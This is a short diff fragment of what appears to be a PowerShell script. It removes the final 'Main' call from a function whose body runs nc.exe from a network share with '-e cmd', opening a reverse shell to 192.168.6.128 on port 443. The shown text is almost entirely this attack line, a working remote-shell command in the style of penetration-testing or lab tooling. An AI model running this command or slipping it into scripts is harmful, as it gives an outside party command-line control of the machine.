@@ -15,5 +15,3 @@ function Main
 
     cmd /c \\192.168.6.128\pwn\nc.exe -e cmd 192.168.6.128 443
 }
-
-Main
